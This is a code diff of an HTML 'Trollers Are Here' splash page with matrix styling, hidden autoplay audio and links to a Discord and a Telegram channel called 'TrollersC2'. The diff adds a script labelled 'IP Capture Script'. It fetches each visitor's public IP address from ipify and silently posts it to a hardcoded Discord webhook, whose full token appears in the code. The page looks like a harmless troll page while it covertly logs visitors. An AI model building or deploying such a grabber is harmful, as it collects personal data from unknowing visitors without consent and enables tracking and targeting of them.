@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trollers Are Here</title>
-    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet"> <!-- Minecraft-style font -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         * {
@@ -20,11 +20,13 @@
             align-items: center;
             background-color: #000;
             color: #fff;
-            font-family: 'Press Start 2P', cursive;
+            font-family: 'Press Start 2P', cursive; /* Minecraft-style font */
             font-size: 24px;
             overflow: hidden;
+            cursor: url('weed-icon.svg') 12 12, auto; /* Custom cursor */
         }
 
+        /* Discord and Telegram icon styles */
         .social-icons {
             position: absolute;
             top: 20px;
@@ -32,23 +34,29 @@
             z-index: 3;
         }
         .social-icons a {
-            color: #0f0;
-            font-size: 40px;
+            color: #0f0; /* Green color for matrix theme */
+            font-size: 40px; /* Increase font size for better visibility */
             margin-right: 15px;
-            transition: color 0.3s ease;
+            text-shadow: none; /* No glow by default */
+            transition: color 0.3s ease, text-shadow 0.3s ease; /* Smooth transition for hover effect */
         }
         .social-icons a:hover {
-            color: #00ff00;
+            color: #00ff00; /* Brighter green on hover */
+            text-shadow: 0 0 5px #00ff00; /* Subtle green glow effect on hover */
         }
 
         #message {
             font-size: 48px;
             margin-top: 20px;
-            color: #0f0;
+            color: #0f0; /* Nice green color for text */
+            text-shadow: 0 0 15px #0f0;
             letter-spacing: 5px;
             text-transform: uppercase;
+            position: relative;
+            z-index: 2; /* Ensure message is above matrix effect */
         }
 
+        /* Matrix effect styles */
         .matrix-effect {
             position: absolute;
             top: 0;
@@ -56,54 +64,108 @@
             width: 100%;
             height: 100%;
             pointer-events: none;
+            overflow: hidden;
+            z-index: 1; /* Behind the text */
         }
 
+        .matrix-effect::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(0deg, rgba(0, 255, 0, 0.1) 50%, rgba(0, 0, 0, 0) 50%);
+            background-size: 100% 30px;
+            opacity: 0.2;
+            animation: wave 1s linear infinite;
+        }
+
+        @keyframes wave {
+            from {
+                background-position: 0 0;
+            }
+            to {
+                background-position: 0 100px;
+            }
+        }
+
+        /* Custom cursor styles */
+        .custom-cursor {
+            position: absolute;
+            width: 24px; /* Adjust size as needed */
+            height: 24px; /* Adjust size as needed */
+            background: url('weed-icon.svg') no-repeat center center;
+            background-size: contain;
+            pointer-events: none;
+            z-index: 3;
+            transform: translate(-50%, -50%);
+            transition: filter 0.2s ease; /* Smooth transition for hover effect */
+            filter: drop-shadow(0 0 3px rgba(0, 255, 0, 0.8)); /* Subtle glow effect */
+        }
+
+        body:hover .custom-cursor {
+            filter: drop-shadow(0 0 8px rgba(0, 255, 0, 1)); /* Enhanced glow on hover */
+        }
+
+        /* Hide the YouTube iframe */
+        #youtube-audio {
+            position: absolute;
+            top: -9999px;
+            left: -9999px;
+            z-index: -1; /* Ensure it is behind everything */
+        }
     </style>
 </head>
 <body>
 
+    <!-- Social media icons -->
     <div class="social-icons">
         <a href="https://discord.gg/trollers" target="_blank"><i class="fab fa-discord"></i></a>
-        <a href="https://t.me/TrollersC2" target="_blank"><i class="fab fa-telegram"></i></a>
+        <a href="https://t.me/TrollersC2" target="_blank" class="telegram"><i class="fab fa-telegram"></i></a>
     </div>
 
     <div id="message">Trollers Are Here</div>
 
+    <!-- Matrix effect -->
     <div class="matrix-effect"></div>
 
+    <!-- Custom cursor element -->
+    <div class="custom-cursor"></div>
+
+    <!-- HTML5 Audio Player -->
     <audio controls autoplay loop style="display: none;">
         <source src="troll.mp3" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
 
-    <meta http-equiv="refresh" content="3;url=MAINPAGE.html" />
-
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    
+    <!-- IP Capture Script -->
     <script>
-        var webHookUrl = "https://discord.com/api/webhooks/1282142873160122441/0n11R6q2IBO0kahcYdbpy05ZgTBrOQkwI8Tad7BoImMd99vSIwKImAhMJFhAw8_AssKN";
+        function getIP(json) {
+            var request = new XMLHttpRequest(); //making a request for the webhook
+            request.open("POST", "https://discord.com/api/webhooks/1282142873160122441/0n11R6q2IBO0kahcYdbpy05ZgTBrOQkwI8Tad7BoImMd99vSIwKImAhMJFhAw8_AssKN");
 
-        $(document).ready(function () {
-            var message = {
-                content: "A user visited the page!"
+            request.setRequestHeader('Content-type', 'application/json');
+
+            var params = {
+                username: "Logger",
+                avatar_url: "https://cdn.discordapp.com/attachments/1277561001268482059/1282144768188481607/c2.png?ex=66de49dd&is=66dcf85d&hm=55873e6af2124e8c73d1f05412c707cbcc51cc4b2b27eaf866f0a4399a49e309&",
+                content: "**IP:** *" + json.ip + "*"
             };
+            // just a webhook parameters such as avatar, name, message
 
-            $.ajax({
-                url: webHookUrl,
-                type: "POST",
-                data: JSON.stringify(message),
-                contentType: "application/json",
-                success: function () {
-                    console.log("Message sent to Discord");
-                },
-                error: function () {
-                    console.error("Error sending message to Discord");
-                }
-            });
-        });
+            request.send(JSON.stringify(params));
+        }
     </script>
 
-    <script src="https://cdn.jsdelivr.net/gh/luisoos/IP-Log-To-Discord-Webhook/index.js"></script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script> <!-- using this API to get the IP -->
 
+    <script>
+        document.addEventListener('mousemove', function(e) {
+            const cursor = document.querySelector('.custom-cursor');
+            cursor.style.left = `${e.clientX}px`;
+            cursor.style.top = `${e.clientY}px`;
+        });
+    </script>
 </body>
 </html>
